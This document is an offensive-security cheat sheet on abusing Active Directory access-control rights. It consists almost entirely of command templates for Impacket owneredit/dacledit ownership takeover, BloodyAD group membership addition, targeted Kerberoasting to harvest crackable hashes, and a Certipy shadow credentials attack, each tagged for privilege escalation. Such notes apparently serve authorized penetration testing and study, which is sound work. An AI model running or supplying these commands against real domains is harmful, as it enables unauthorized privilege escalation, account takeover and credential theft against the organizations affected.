# acl

% ACL, Impacket, BloodyAD, TargetedKerberoast

## WriteOwner - Impacket
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/PRIVILEGE-ESCALATION

```bash
DOMAIN=<Domain>
NEW_OWNER=<New_Owner_Username>
USER=<Username>
PASSWORD=<Password>
VICTIM=<Victim_Username>
owneredit.py "$DOMAIN"/"$USER":"$PASSWORD" -action write -target "$VICTIM" -new-owner "$NEW_OWNER"
dacledit.py -action 'write' -rights 'FullControl' -principal "$NEW_OWNER" -target "$VICTIM" "$DOMAIN"/"$USER":"$PASSWORD"
unset DOMAIN NEW_OWNER USER PASSWORD VICTIM
```

## add group Member - AddSelf/GenericAll - BloodyAD
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/PRIVILEGE-ESCALATION
AddSelf/GenericAll to a group

```bash
bloodyAD --host <IP> -u <Username> -p <Password> add groupMember <Group> <Member>
```

## WriteSPN - Targeted Kerberoast
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/KERBEROASTING

The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well.

The recovered hash can be cracked offline using the tool of your choice.

Note: <Creds_Options> can be either -p (for password) or -H (for NT hash)

```bash
targetedKerberoast.py -v -d <Domain> -u <Username> <Creds_Options> <Password> -o targeted_kerberoast_hashes.txt
```

## Shadow Credentials Attack
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/PRIVILEGE-ESCALATION

```bash
certipy shadow auto -target <IP> -u <Username> -p <Password> -account <Target_Username>
```